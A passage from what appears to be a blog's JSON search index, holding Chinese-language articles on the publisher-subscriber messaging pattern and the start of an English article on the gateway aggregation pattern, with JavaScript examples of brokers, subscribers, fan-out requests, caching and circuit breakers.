$&#123;subscriber.id&#125;:`, error); // 处理重试逻辑、死信队列等 &#125; &#125; &#125; 3. 订阅者 接收消息的组件： class Subscriber &#123; constructor(broker, subscriptionConfig) &#123; this.broker = broker; this.config = subscriptionConfig; &#125; async start() &#123; await this.broker.subscribe( this.config.topic, this.handleMessage.bind(this) ); &#125; async handleMessage(message) &#123; // 按类型过滤消息 if (this.config.messageTypes.includes(message.type)) &#123; await this.processMessage(message); &#125; &#125; async processMessage(message) &#123; // 实现业务逻辑 &#125; &#125; 主要优势 1. 解耦 发布者和订阅者独立运作： graph LR P1[订单服务] --> MB{消息代理} P2[用户服务] --> MB P3[支付服务] --> MB MB --> S1[电子邮件服务] MB --> S2[分析] MB --> S3[审计日志] MB --> S4[报表] style MB fill:#ffd43b,stroke:#fab005 style P1 fill:#4dabf7,stroke:#1971c2 style P2 fill:#4dabf7,stroke:#1971c2 style P3 fill:#4dabf7,stroke:#1971c2 style S1 fill:#51cf66,stroke:#2f9e44 style S2 fill:#51cf66,stroke:#2f9e44 style S3 fill:#51cf66,stroke:#2f9e44 style S4 fill:#51cf66,stroke:#2f9e44 // 发布者不知道订阅者 class OrderService &#123; async createOrder(order) &#123; await this.saveOrder(order); await this.broker.publish('orders', &#123; type: 'OrderCreated', data: order &#125;); // 完成！不需要知道谁在监听 &#125; &#125; // 添加订阅者无需更改发布者 class FraudDetectionService &#123; async start() &#123; // 订阅现有主题 await this.broker.subscribe('orders', async (message) => &#123; if (message.type === 'OrderCreated') &#123; await this.checkForFraud(message.data); &#125; &#125;); &#125; &#125; 2. 可扩展性 通过独立扩展订阅者来处理增加的负载： // 根据负载扩展特定订阅者 class MessageBroker &#123; async subscribe(topic, handler, options = &#123;&#125;) &#123; const subscription = &#123; id: this.generateSubscriberId(), handler: handler, concurrency: options.concurrency || 1 &#125;; // 多个实例可以订阅相同主题 this.topics.get(topic).push(subscription); &#125; &#125; // 部署多个慢速服务实例 for (let i = 0; i &lt; 5; i++) &#123; const emailService = new EmailService(broker); await emailService.start(); // 5 个实例处理电子邮件 &#125; 3. 可靠性 即使组件失败，系统仍继续运作： class ResilientSubscriber &#123; async handleMessage(message) &#123; try &#123; await this.processMessage(message); await this.acknowledgeMessage(message.id); &#125; catch (error) &#123; console.error('处理失败:', error); // 消息保留在队列中以便重试 if (message.retryCount &lt; 3) &#123; await this.requeueMessage(message); &#125; else &#123; // 移至死信队列以供调查 await this.moveToDeadLetter(message); &#125; &#125; &#125; &#125; 4. 异步处理 发布者立即返回而不等待： class OrderService &#123; async createOrder(orderData) &#123; const order = await this.saveOrder(orderData); // 发布并立即返回 await this.broker.publish('orders', &#123; type: 'OrderCreated', data: order &#125;); // 返回给用户而不等待处理 return &#123; orderId: order.id, status: 'processing' &#125;; &#125; &#125; // 订阅者按自己的步调处理 class SlowEmailService &#123; async handleMessage(message) &#123; // 可能需要几分钟发送电子邮件 await this.sendEmail(message.data.email); // 发布者已经返回给用户 &#125; &#125; 高级模式 基于主题的路由 按主题组织消息： class TopicBasedBroker &#123; // 发布者发送到特定主题 async publishToTopic(topic, message) &#123; await this.broker.publish(topic, message); &#125; &#125; // 订阅者选择主题 await broker.subscribe('orders.created', handleOrderCreated); await broker.subscribe('orders.cancelled', handleOrderCancelled); await broker.subscribe('payments.processed', handlePaymentProcessed); 基于内容的过滤 订阅者按消息内容过滤： class FilteringSubscriber &#123; async start() &#123; await this.broker.subscribe('orders', async (message) => &#123; // 只处理高价值订单 if (message.data.total > 1000) &#123; await this.processHighValueOrder(message.data); &#125; &#125;); &#125; &#125; // 另一个具有不同过滤器的订阅者 class RegionalSubscriber &#123; async start() &#123; await this.broker.subscribe('orders', async (message) => &#123; // 只处理特定区域的订单 if (message.data.region === 'US-WEST') &#123; await this.processRegionalOrder(message.data); &#125; &#125;); &#125; &#125; 通配符订阅 订阅多个相关主题： // 订阅所有订单相关事件 await broker.subscribe('orders.*', handleOrderEvent); // 订阅来自服务的所有事件 await broker.subscribe('payment-service.*', handlePaymentEvent); // 订阅所有内容（监控/日志记录） await broker.subscribe('*', logAllEvents); 重要考量 消息顺序 消息可能不按顺序到达： class OrderAwareSubscriber &#123; constructor() &#123; this.processedMessages = new Set(); &#125; async handleMessage(message) &#123; // 使处理具有幂等性 if (this.processedMessages.has(message.id)) &#123; console.log('已处理:', message.id); return; &#125; await this.processMessage(message); this.processedMessages.add(message.id); &#125; &#125; 重复消息 处理多次到达的消息： class IdempotentSubscriber &#123; async handleMessage(message) &#123; // 检查是否已处理 const exists = await this.db.findOne(&#123; messageId: message.id &#125;); if (exists) &#123; return; // 跳过重复 &#125; // 处理并记录 await this.processMessage(message); await this.db.insert(&#123; messageId: message.id, processedAt: new Date() &#125;); &#125; &#125; 毒消息 处理格式错误或有问题的消息： class SafeSubscriber &#123; async handleMessage(message) &#123; try &#123; await this.validateMessage(message); await this.processMessage(message); &#125; catch (error) &#123; if (this.isUnrecoverable(error)) &#123; // 移至死信队列 await this.deadLetterQueue.send(message); console.error('检测到毒消息:', message.id); &#125; else &#123; // 稍后重试 throw error; &#125; &#125; &#125; &#125; 消息过期 处理时效性消息： class ExpirationAwareSubscriber &#123; async handleMessage(message) &#123; const expiresAt = new Date(message.expiresAt); if (Date.now() > expiresAt) &#123; console.log('消息已过期:', message.id); return; // 丢弃过期消息 &#125; await this.processMessage(message); &#125; &#125; 何时使用此模式 ✅ 使用发布者-订阅者的时机广播：需要向多个消费者发送信息 解耦：想要独立开发服务 可扩展性：需要处理不同组件的不同负载 异步：不需要消费者的即时响应 可扩展性：想要添加消费者而不更改发布者 事件驱动：构建事件驱动架构 ❌ 避免使用发布者-订阅者的时机少数消费者：只有 1-2 个需求非常不同的消费者 需要实时：需要即时、同步响应 简单通信：直接调用会更简单且足够 保证顺序：严格的消息顺序至关重要 事务性：需要跨发布者和订阅者的原子操作 真实世界示例：电子商务订单处理 // 订单服务发布事件 class OrderService &#123; async createOrder(orderData) &#123; const order = await this.db.orders.create(orderData); await this.broker.publish('orders', &#123; type: 'OrderCreated', orderId: order.id, customerId: order.customerId, items: order.items, total: order.total, timestamp: new Date().toISOString() &#125;); return order; &#125; &#125; // 多个订阅者处理不同方面 class InventoryService &#123; async start() &#123; await this.broker.subscribe('orders', async (msg) => &#123; if (msg.type === 'OrderCreated') &#123; await this.reserveInventory(msg.items); &#125; &#125;); &#125; &#125; class PaymentService &#123; async start() &#123; await this.broker.subscribe('orders', async (msg) => &#123; if (msg.type === 'OrderCreated') &#123; await this.chargeCustomer(msg.customerId, msg.total); &#125; &#125;); &#125; &#125; class NotificationService &#123; async start() &#123; await this.broker.subscribe('orders', async (msg) => &#123; if (msg.type === 'OrderCreated') &#123; await this.sendConfirmationEmail(msg.customerId, msg.orderId); &#125; &#125;); &#125; &#125; class AnalyticsService &#123; async start() &#123; await this.broker.subscribe('orders', async (msg) => &#123; if (msg.type === 'OrderCreated') &#123; await this.trackSale(msg.total, msg.items); &#125; &#125;); &#125; &#125; // 稍后添加的服务，无需更改 OrderService class LoyaltyService &#123; async start() &#123; await this.broker.subscribe('orders', async (msg) => &#123; if (msg.type === 'OrderCreated') &#123; await this.awardPoints(msg.customerId, msg.total); &#125; &#125;); &#125; &#125; 与相关模式的比较 发布者-订阅者 vs 观察者模式 发布-订阅模式建立在观察者模式之上，但增加了异步消息传递和代理中介者，提供更好的解耦和可扩展性。 发布者-订阅者 vs 消息队列 消息队列通常将每个消息传递给一个消费者（竞争消费者），而发布-订阅将每个消息传递给所有感兴趣的订阅者。 结论 发布者-订阅者模式对于构建可扩展、松散耦合的分布式系统至关重要。通过在发布者和订阅者之间引入消息代理，您可以获得： 开发和部署的独立性 单独扩展组件的能力 对组件失败的弹性 在不更改现有代码的情况下添加功能的灵活性 在构建需要向多个消费者广播事件的系统时，特别是在分布式环境中，发布者-订阅者模式为异步、事件驱动的通信提供了坚实的基础。 参考资料 异步消息入门 事件驱动架构风格 使用消息队列和事件的企业集成","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-CN"},{"title":"發佈者-訂閱者模式：大規模解耦通訊","slug":"2019/10/Publisher-Subscriber-Pattern-zh-TW","date":"un33fin33","updated":"un55fin55","comments":true,"path":"/zh-TW/2019/10/Publisher-Subscriber-Pattern/","permalink":"https://neo01.com/zh-TW/2019/10/Publisher-Subscriber-Pattern/","excerpt":"讓應用程式能夠非同步地向多個消費者發布事件，而不需要將發送者與接收者耦合在一起。了解發佈-訂閱訊息如何提升可擴展性和可靠性。","text":"想像一家報社。他們印刷一次新聞，成千上萬的訂閱者就能收到，而報社不需要知道他們是誰或住在哪裡。報社不會等待每個訂閱者讀完報紙才印刷下一期。這就是發佈者-訂閱者模式的本質——一種在分散式系統中解耦通訊的強大方法。 報紙類比 就像報紙的運作方式： 發佈者創建一次內容 多個訂閱者接收相同內容 發佈者不知道個別訂閱者 傳遞是非同步的 訂閱者可以自由來去 在軟體中，發佈-訂閱模式： 發送者發佈一次訊息 多個消費者接收訊息 發送者不知道消費者身份 通訊是非同步的 消費者可以動態訂閱/取消訂閱 graph TB P[發佈者] --> IC[輸入通道] IC --> MB{訊息代理} MB --> OC1[輸出通道 1] MB --> OC2[輸出通道 2] MB --> OC3[輸出通道 3] OC1 --> S1[訂閱者 1] OC2 --> S2[訂閱者 2] OC3 --> S3[訂閱者 3] style P fill:#4dabf7,stroke:#1971c2 style MB fill:#ffd43b,stroke:#fab005 style S1 fill:#51cf66,stroke:#2f9e44 style S2 fill:#51cf66,stroke:#2f9e44 style S3 fill:#51cf66,stroke:#2f9e44 問題：事件分發中的緊密耦合 在分散式應用程式中，元件經常需要在事件發生時通知其他元件。傳統方法會造成緊密耦合和可擴展性問題。 傳統方法：直接通訊 class OrderService &#123; async createOrder(orderData) &#123; const order = await this.saveOrder(orderData); // 直接呼叫每個相依服務 await this.inventoryService.reserveItems(order.items); await this.paymentService.processPayment(order.payment); await this.shippingService.scheduleDelivery(order.address); await this.notificationService.sendConfirmation(order.email); await this.analyticsService.trackOrder(order.id); return order; &#125; &#125; ⚠️ 直接通訊的問題緊密耦合：OrderService 必須知道所有相依服務 阻塞：發送者等待每個服務回應 脆弱性：如果任何服務停機，訂單建立就會失敗 可擴展性：新增消費者需要修改發送者 效能：循序呼叫增加回應時間 專用佇列方法 class OrderService &#123; async createOrder(orderData) &#123; const order = await this.saveOrder(orderData); // 發送到個別佇列 await this.inventoryQueue.send(order); await this.paymentQueue.send(order); await this.shippingQueue.send(order); await this.notificationQueue.send(order); await this.analyticsQueue.send(order); return order; &#125; &#125; ⚠️ 專用佇列的問題佇列激增：每個消費者一個佇列無法擴展 仍然耦合：發送者必須知道所有佇列名稱 維護負擔：新增消費者需要修改程式碼 重複訊息：相同訊息發送多次 解決方案：發佈者-訂閱者模式 引入一個訊息子系統，將發佈者與訂閱者解耦： class OrderService &#123; constructor(messageBroker) &#123; this.broker = messageBroker; &#125; async createOrder(orderData) &#123; const order = await this.saveOrder(orderData); // 發佈一次 - 代理處理分發 await this.broker.publish('orders', &#123; type: 'OrderCreated', data: order, timestamp: new Date().toISOString() &#125;); return order; &#125; &#125; 訂閱者獨立註冊他們的興趣： // 庫存服務 class InventoryService &#123; constructor(messageBroker) &#123; this.broker = messageBroker; &#125; async start() &#123; await this.broker.subscribe('orders', async (message) => &#123; if (message.type === 'OrderCreated') &#123; await this.reserveItems(message.data.items); &#125; &#125;); &#125; &#125; // 付款服務 class PaymentService &#123; async start() &#123; await this.broker.subscribe('orders', async (message) => &#123; if (message.type === 'OrderCreated') &#123; await this.processPayment(message.data.payment); &#125; &#125;); &#125; &#125; // 分析服務（稍後新增，無需更改 OrderService） class AnalyticsService &#123; async start() &#123; await this.broker.subscribe('orders', async (message) => &#123; if (message.type === 'OrderCreated') &#123; await this.trackOrder(message.data.id); &#125; &#125;); &#125; &#125; 關鍵元件 1. 發佈者 發送訊息的元件： class Publisher &#123; constructor(broker) &#123; this.broker = broker; &#125; async publishEvent(topic, eventType, data) &#123; const message = &#123; id: this.generateMessageId(), type: eventType, data: data, timestamp: new Date().toISOString(), source: 'order-service' &#125;; await this.broker.publish(topic, message); console.log(`已發佈 $&#123;eventType&#125; 到 $&#123;topic&#125;`); &#125; &#125; 2. 訊息代理 路由訊息的中介者： class MessageBroker &#123; constructor() &#123; this.topics = new Map(); &#125; async publish(topic, message) &#123; const subscribers = this.topics.get(topic) || []; // 複製訊息到所有訂閱者 const deliveryPromises = subscribers.map(subscriber => this.deliverMessage(subscriber, message) ); await Promise.all(deliveryPromises); &#125; async subscribe(topic, handler) &#123; if (!this.topics.has(topic)) &#123; this.topics.set(topic, []); &#125; this.topics.get(topic).push(&#123; id: this.generateSubscriberId(), handler: handler &#125;); &#125; async deliverMessage(subscriber, message) &#123; try &#123; await subscriber.handler(message); &#125; catch (error) &#123; console.error(`傳遞失敗到 $&#123;subscriber.id&#125;:`, error); // 處理重試邏輯、死信佇列等 &#125; &#125; &#125; 3. 訂閱者 接收訊息的元件： class Subscriber &#123; constructor(broker, subscriptionConfig) &#123; this.broker = broker; this.config = subscriptionConfig; &#125; async start() &#123; await this.broker.subscribe( this.config.topic, this.handleMessage.bind(this) ); &#125; async handleMessage(message) &#123; // 依類型過濾訊息 if (this.config.messageTypes.includes(message.type)) &#123; await this.processMessage(message); &#125; &#125; async processMessage(message) &#123; // 實作業務邏輯 &#125; &#125; 主要優勢 1. 解耦 發佈者和訂閱者獨立運作： graph LR P1[訂單服務] --> MB{訊息代理} P2[使用者服務] --> MB P3[付款服務] --> MB MB --> S1[電子郵件服務] MB --> S2[分析] MB --> S3[稽核日誌] MB --> S4[報表] style MB fill:#ffd43b,stroke:#fab005 style P1 fill:#4dabf7,stroke:#1971c2 style P2 fill:#4dabf7,stroke:#1971c2 style P3 fill:#4dabf7,stroke:#1971c2 style S1 fill:#51cf66,stroke:#2f9e44 style S2 fill:#51cf66,stroke:#2f9e44 style S3 fill:#51cf66,stroke:#2f9e44 style S4 fill:#51cf66,stroke:#2f9e44 // 發佈者不知道訂閱者 class OrderService &#123; async createOrder(order) &#123; await this.saveOrder(order); await this.broker.publish('orders', &#123; type: 'OrderCreated', data: order &#125;); // 完成！不需要知道誰在監聽 &#125; &#125; // 新增訂閱者無需更改發佈者 class FraudDetectionService &#123; async start() &#123; // 訂閱現有主題 await this.broker.subscribe('orders', async (message) => &#123; if (message.type === 'OrderCreated') &#123; await this.checkForFraud(message.data); &#125; &#125;); &#125; &#125; 2. 可擴展性 透過獨立擴展訂閱者來處理增加的負載： // 根據負載擴展特定訂閱者 class MessageBroker &#123; async subscribe(topic, handler, options = &#123;&#125;) &#123; const subscription = &#123; id: this.generateSubscriberId(), handler: handler, concurrency: options.concurrency || 1 &#125;; // 多個實例可以訂閱相同主題 this.topics.get(topic).push(subscription); &#125; &#125; // 部署多個慢速服務實例 for (let i = 0; i &lt; 5; i++) &#123; const emailService = new EmailService(broker); await emailService.start(); // 5 個實例處理電子郵件 &#125; 3. 可靠性 即使元件失敗，系統仍繼續運作： class ResilientSubscriber &#123; async handleMessage(message) &#123; try &#123; await this.processMessage(message); await this.acknowledgeMessage(message.id); &#125; catch (error) &#123; console.error('處理失敗:', error); // 訊息保留在佇列中以便重試 if (message.retryCount &lt; 3) &#123; await this.requeueMessage(message); &#125; else &#123; // 移至死信佇列以供調查 await this.moveToDeadLetter(message); &#125; &#125; &#125; &#125; 4. 非同步處理 發佈者立即返回而不等待： class OrderService &#123; async createOrder(orderData) &#123; const order = await this.saveOrder(orderData); // 發佈並立即返回 await this.broker.publish('orders', &#123; type: 'OrderCreated', data: order &#125;); // 返回給使用者而不等待處理 return &#123; orderId: order.id, status: 'processing' &#125;; &#125; &#125; // 訂閱者按自己的步調處理 class SlowEmailService &#123; async handleMessage(message) &#123; // 可能需要幾分鐘發送電子郵件 await this.sendEmail(message.data.email); // 發佈者已經返回給使用者 &#125; &#125; 進階模式 基於主題的路由 依主題組織訊息： class TopicBasedBroker &#123; // 發佈者發送到特定主題 async publishToTopic(topic, message) &#123; await this.broker.publish(topic, message); &#125; &#125; // 訂閱者選擇主題 await broker.subscribe('orders.created', handleOrderCreated); await broker.subscribe('orders.cancelled', handleOrderCancelled); await broker.subscribe('payments.processed', handlePaymentProcessed); 基於內容的過濾 訂閱者依訊息內容過濾： class FilteringSubscriber &#123; async start() &#123; await this.broker.subscribe('orders', async (message) => &#123; // 只處理高價值訂單 if (message.data.total > 1000) &#123; await this.processHighValueOrder(message.data); &#125; &#125;); &#125; &#125; // 另一個具有不同過濾器的訂閱者 class RegionalSubscriber &#123; async start() &#123; await this.broker.subscribe('orders', async (message) => &#123; // 只處理特定區域的訂單 if (message.data.region === 'US-WEST') &#123; await this.processRegionalOrder(message.data); &#125; &#125;); &#125; &#125; 萬用字元訂閱 訂閱多個相關主題： // 訂閱所有訂單相關事件 await broker.subscribe('orders.*', handleOrderEvent); // 訂閱來自服務的所有事件 await broker.subscribe('payment-service.*', handlePaymentEvent); // 訂閱所有內容（監控/日誌記錄） await broker.subscribe('*', logAllEvents); 重要考量 訊息順序 訊息可能不按順序到達： class OrderAwareSubscriber &#123; constructor() &#123; this.processedMessages = new Set(); &#125; async handleMessage(message) &#123; // 使處理具有冪等性 if (this.processedMessages.has(message.id)) &#123; console.log('已處理:', message.id); return; &#125; await this.processMessage(message); this.processedMessages.add(message.id); &#125; &#125; 重複訊息 處理多次到達的訊息： class IdempotentSubscriber &#123; async handleMessage(message) &#123; // 檢查是否已處理 const exists = await this.db.findOne(&#123; messageId: message.id &#125;); if (exists) &#123; return; // 跳過重複 &#125; // 處理並記錄 await this.processMessage(message); await this.db.insert(&#123; messageId: message.id, processedAt: new Date() &#125;); &#125; &#125; 毒訊息 處理格式錯誤或有問題的訊息： class SafeSubscriber &#123; async handleMessage(message) &#123; try &#123; await this.validateMessage(message); await this.processMessage(message); &#125; catch (error) &#123; if (this.isUnrecoverable(error)) &#123; // 移至死信佇列 await this.deadLetterQueue.send(message); console.error('偵測到毒訊息:', message.id); &#125; else &#123; // 稍後重試 throw error; &#125; &#125; &#125; &#125; 訊息過期 處理時效性訊息： class ExpirationAwareSubscriber &#123; async handleMessage(message) &#123; const expiresAt = new Date(message.expiresAt); if (Date.now() > expiresAt) &#123; console.log('訊息已過期:', message.id); return; // 丟棄過期訊息 &#125; await this.processMessage(message); &#125; &#125; 何時使用此模式 ✅ 使用發佈者-訂閱者的時機廣播：需要向多個消費者發送資訊 解耦：想要獨立開發服務 可擴展性：需要處理不同元件的不同負載 非同步：不需要消費者的即時回應 可擴展性：想要新增消費者而不更改發佈者 事件驅動：建構事件驅動架構 ❌ 避免使用發佈者-訂閱者的時機少數消費者：只有 1-2 個需求非常不同的消費者 需要即時：需要即時、同步回應 簡單通訊：直接呼叫會更簡單且足夠 保證順序：嚴格的訊息順序至關重要 交易性：需要跨發佈者和訂閱者的原子操作 真實世界範例：電子商務訂單處理 // 訂單服務發佈事件 class OrderService &#123; async createOrder(orderData) &#123; const order = await this.db.orders.create(orderData); await this.broker.publish('orders', &#123; type: 'OrderCreated', orderId: order.id, customerId: order.customerId, items: order.items, total: order.total, timestamp: new Date().toISOString() &#125;); return order; &#125; &#125; // 多個訂閱者處理不同方面 class InventoryService &#123; async start() &#123; await this.broker.subscribe('orders', async (msg) => &#123; if (msg.type === 'OrderCreated') &#123; await this.reserveInventory(msg.items); &#125; &#125;); &#125; &#125; class PaymentService &#123; async start() &#123; await this.broker.subscribe('orders', async (msg) => &#123; if (msg.type === 'OrderCreated') &#123; await this.chargeCustomer(msg.customerId, msg.total); &#125; &#125;); &#125; &#125; class NotificationService &#123; async start() &#123; await this.broker.subscribe('orders', async (msg) => &#123; if (msg.type === 'OrderCreated') &#123; await this.sendConfirmationEmail(msg.customerId, msg.orderId); &#125; &#125;); &#125; &#125; class AnalyticsService &#123; async start() &#123; await this.broker.subscribe('orders', async (msg) => &#123; if (msg.type === 'OrderCreated') &#123; await this.trackSale(msg.total, msg.items); &#125; &#125;); &#125; &#125; // 稍後新增的服務，無需更改 OrderService class LoyaltyService &#123; async start() &#123; await this.broker.subscribe('orders', async (msg) => &#123; if (msg.type === 'OrderCreated') &#123; await this.awardPoints(msg.customerId, msg.total); &#125; &#125;); &#125; &#125; 與相關模式的比較 發佈者-訂閱者 vs 觀察者模式 發佈-訂閱模式建立在觀察者模式之上，但增加了非同步訊息傳遞和代理中介者，提供更好的解耦和可擴展性。 發佈者-訂閱者 vs 訊息佇列 訊息佇列通常將每個訊息傳遞給一個消費者（競爭消費者），而發佈-訂閱將每個訊息傳遞給所有感興趣的訂閱者。 結論 發佈者-訂閱者模式對於建構可擴展、鬆散耦合的分散式系統至關重要。透過在發佈者和訂閱者之間引入訊息代理，您可以獲得： 開發和部署的獨立性 單獨擴展元件的能力 對元件失敗的彈性 在不更改現有程式碼的情況下新增功能的靈活性 在建構需要向多個消費者廣播事件的系統時，特別是在分散式環境中，發佈者-訂閱者模式為非同步、事件驅動的通訊提供了堅實的基礎。 參考資料 非同步訊息入門 事件驅動架構風格 使用訊息佇列和事件的企業整合","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-TW"},{"title":"Gateway Aggregation Pattern: Reducing Network Chattiness","slug":"2019/09/Gateway-Aggregation-Pattern","date":"un55fin55","updated":"un55fin55","comments":true,"path":"2019/09/Gateway-Aggregation-Pattern/","permalink":"https://neo01.com/2019/09/Gateway-Aggregation-Pattern/","excerpt":"Combine multiple backend requests into a single call through a gateway. Learn how this pattern reduces network overhead and improves performance in distributed systems.","text":"Imagine ordering a meal at a restaurant. Instead of making separate trips to the kitchen for your appetizer, main course, side dishes, and dessert, the waiter aggregates your entire order and brings everything together in coordinated courses. This is the essence of the Gateway Aggregation pattern—a single point that collects multiple requests and delivers a unified response. The Problem: Too Many Calls Modern applications often need data from multiple backend services to complete a single user action. Consider a product page that displays: Product details from the catalog service Inventory status from the warehouse service Customer reviews from the review service Recommended products from the recommendation engine Pricing information from the pricing service The Chatty Approach Without aggregation, the client makes multiple individual calls: // Client makes 5 separate network calls class ProductPageClient &#123; async loadProductPage(productId) &#123; // Each call has network overhead const product = await fetch(`https://api.example.com/catalog/$&#123;productId&#125;`); const inventory = await fetch(`https://api.example.com/inventory/$&#123;productId&#125;`); const reviews = await fetch(`https://api.example.com/reviews/$&#123;productId&#125;`); const recommendations = await fetch(`https://api.example.com/recommendations/$&#123;productId&#125;`); const pricing = await fetch(`https://api.example.com/pricing/$&#123;productId&#125;`); return &#123; product: await product.json(), inventory: await inventory.json(), reviews: await reviews.json(), recommendations: await recommendations.json(), pricing: await pricing.json() &#125;; &#125; &#125; graph TB Client[Client Application] Client -->|1. Get Product| Catalog[Catalog Service] Client -->|2. Get Inventory| Inventory[Inventory Service] Client -->|3. Get Reviews| Reviews[Review Service] Client -->|4. Get Recommendations| Recommend[Recommendation Service] Client -->|5. Get Pricing| Pricing[Pricing Service] Catalog -->|Response| Client Inventory -->|Response| Client Reviews -->|Response| Client Recommend -->|Response| Client Pricing -->|Response| Client style Client fill:#e03131,stroke:#c92a2a ⚠️ Problems with Multiple CallsHigh Latency: Each request adds network round-trip time Resource Intensive: Multiple connections consume client resources Failure Prone: More calls mean more opportunities for failure Mobile Unfriendly: Cellular networks amplify latency issues Complex Error Handling: Managing failures across multiple calls The Real Cost On a high-latency network (e.g., 100ms round-trip): Sequential calls: 5 requests × 100ms &#x3D; 500ms minimum Parallel calls: 100ms + connection overhead + processing time Even with parallel requests, you’re managing multiple connections, handling multiple failure scenarios, and consuming more battery on mobile devices. The Solution: Gateway Aggregation Place a gateway between the client and backend services. The gateway receives a single request, fans out to multiple services, aggregates the responses, and returns a unified result. graph TB Client[Client Application] Client -->|Single Request| Gateway[Aggregation Gateway] Gateway -->|Fan Out| Catalog[Catalog Service] Gateway -->|Fan Out| Inventory[Inventory Service] Gateway -->|Fan Out| Reviews[Review Service] Gateway -->|Fan Out| Recommend[Recommendation Service] Gateway -->|Fan Out| Pricing[Pricing Service] Catalog -->|Response| Gateway Inventory -->|Response| Gateway Reviews -->|Response| Gateway Recommend -->|Response| Gateway Pricing -->|Response| Gateway Gateway -->|Aggregated Response| Client style Gateway fill:#51cf66,stroke:#2f9e44 style Client fill:#4dabf7,stroke:#1971c2 Simple Implementation // Client makes ONE call class ProductPageClient &#123; async loadProductPage(productId) &#123; const response = await fetch( `https://gateway.example.com/product-page/$&#123;productId&#125;` ); return await response.json(); &#125; &#125; // Gateway handles aggregation class AggregationGateway &#123; async getProductPage(req, res) &#123; const &#123; productId &#125; = req.params; // Fan out to all services in parallel const [product, inventory, reviews, recommendations, pricing] = await Promise.all([ this.catalogService.getProduct(productId), this.inventoryService.getStock(productId), this.reviewService.getReviews(productId), this.recommendationService.getRecommendations(productId), this.pricingService.getPrice(productId) ]); // Aggregate and return res.json(&#123; product, inventory, reviews, recommendations, pricing &#125;); &#125; &#125; Key Benefits 1. Reduced Network Overhead Before: 5 requests from client to cloud Client → [100ms] → Service 1 Client → [100ms] → Service 2 Client → [100ms] → Service 3 Client → [100ms] → Service 4 Client → [100ms] → Service 5 Total: 500ms (sequential) or 100ms + overhead (parallel) After: 1 request from client, 5 requests within data center Client → [100ms] → Gateway Gateway → [1ms] → Service 1 Gateway → [1ms] → Service 2 Gateway → [1ms] → Service 3 Gateway → [1ms] → Service 4 Gateway → [1ms] → Service 5 Gateway → [100ms] → Client Total: ~200ms 2. Simplified Client Code // Before: Complex client logic class ComplexClient &#123; async loadData() &#123; try &#123; const results = await Promise.allSettled([ this.fetchService1(), this.fetchService2(), this.fetchService3() ]); // Handle partial failures const data = &#123;&#125;; results.forEach((result, index) => &#123; if (result.status === 'fulfilled') &#123; data[`service$&#123;index + 1&#125;`] = result.value; &#125; else &#123; data[`service$&#123;index + 1&#125;`] = null; this.logError(result.reason); &#125; &#125;); return data; &#125; catch (error) &#123; // Error handling &#125; &#125; &#125; // After: Simple client logic class SimpleClient &#123; async loadData() &#123; return await fetch('https://gateway.example.com/aggregated-data') .then(res => res.json()); &#125; &#125; 3. Centralized Error Handling class ResilientGateway &#123; async aggregateData(req, res) &#123; const results = await Promise.allSettled([ this.fetchCriticalData(), this.fetchOptionalData1(), this.fetchOptionalData2() ]); // Critical data must succeed if (results[0].status === 'rejected') &#123; return res.status(503).json(&#123; error: 'Critical service unavailable' &#125;); &#125; // Optional data can fail gracefully res.json(&#123; critical: results[0].value, optional1: results[1].status === 'fulfilled' ? results[1].value : null, optional2: results[2].status === 'fulfilled' ? results[2].value : null &#125;); &#125; &#125; Implementation Patterns Pattern 1: Simple Aggregation Combine responses as-is: class SimpleAggregator &#123; async aggregate(userId) &#123; const [profile, orders, preferences] = await Promise.all([ this.userService.getProfile(userId), this.orderService.getOrders(userId), this.preferenceService.getPreferences(userId) ]); return &#123; profile, orders, preferences &#125;; &#125; &#125; Pattern 2: Data Transformation Transform and combine data: class TransformingAggregator &#123; async aggregate(userId) &#123; const [user, orders, reviews] = await Promise.all([ this.userService.getUser(userId), this.orderService.getOrders(userId), this.reviewService.getReviews(userId) ]); // Transform and enrich return &#123; user: &#123; id: user.id, name: user.fullName, memberSince: user.createdAt &#125;, stats: &#123; totalOrders: orders.length, totalSpent: orders.reduce((sum, o) => sum + o.amount, 0), reviewCount: reviews.length, averageRating: this.calculateAverage(reviews) &#125;, recentActivity: this.combineActivity(orders, reviews) &#125;; &#125; &#125; Pattern 3: Conditional Aggregation Fetch data based on conditions: class ConditionalAggregator &#123; async aggregate(productId, options) &#123; // Always fetch product const product = await this.catalogService.getProduct(productId); // Conditionally fetch additional data const requests = [Promise.resolve(product)]; if (options.includeReviews) &#123; requests.push(this.reviewService.getReviews(productId)); &#125; if (options.includeRelated) &#123; requests.push(this.recommendationService.getRelated(productId)); &#125; if (product.type === 'physical') &#123; requests.push(this.inventoryService.getStock(productId)); &#125; const results = await Promise.all(requests); return this.buildResponse(results, options); &#125; &#125; Advanced Considerations Timeout and Partial Responses Handle slow services gracefully: class TimeoutAwareGateway &#123; async aggregateWithTimeout(productId) &#123; const timeout = (ms, defaultValue) => new Promise(resolve => setTimeout(() => resolve(defaultValue), ms)); const [product, inventory, reviews] = await Promise.all([ // Critical: no timeout this.catalogService.getProduct(productId), // Optional: 500ms timeout Promise.race([ this.inventoryService.getStock(productId), timeout(500, &#123; available: false, message: 'Check back later' &#125;) ]), // Optional: 1000ms timeout Promise.race([ this.reviewService.getReviews(productId), timeout(1000, &#123; reviews: [], message: 'Reviews temporarily unavailable' &#125;) ]) ]); return &#123; product, inventory, reviews &#125;; &#125; &#125; Caching Strategy Reduce backend load with caching: class CachingGateway &#123; constructor() &#123; this.cache = new Cache(); &#125; async aggregate(productId) &#123; // Check cache first const cached = await this.cache.get(`product:$&#123;productId&#125;`); if (cached) &#123; return cached; &#125; // Fetch and cache const data = await this.fetchAndAggregate(productId); // Cache with different TTLs await this.cache.set(`product:$&#123;productId&#125;`, data, &#123; ttl: 300 // 5 minutes &#125;); return data; &#125; &#125; Circuit Breaking Protect against cascading failures: class ResilientGateway &#123; constructor() &#123; this.circuitBreakers = &#123; inventory: new CircuitBreaker(&#123; threshold: 5, timeout: 60000 &#125;), reviews: new CircuitBreaker(&#123; threshold: 5, timeout: 60000 &#125;) &#125;; &#125; async aggregate(productId) &#123; const product = await this.catalogService.getProduct(productId); // Use circuit breakers for optional services const inventory = await this.circuitBreakers.inventory.execute( () => this.inventoryService.getStock(productId), &#123; fallback: &#123; available: false &#125; &#125; ); const reviews = await this.circuitBreakers.reviews.execute( () => this.reviewService.getReviews(productId), &#123; fallback: &#123; reviews: [] &#125; &#125; ); return &#123; 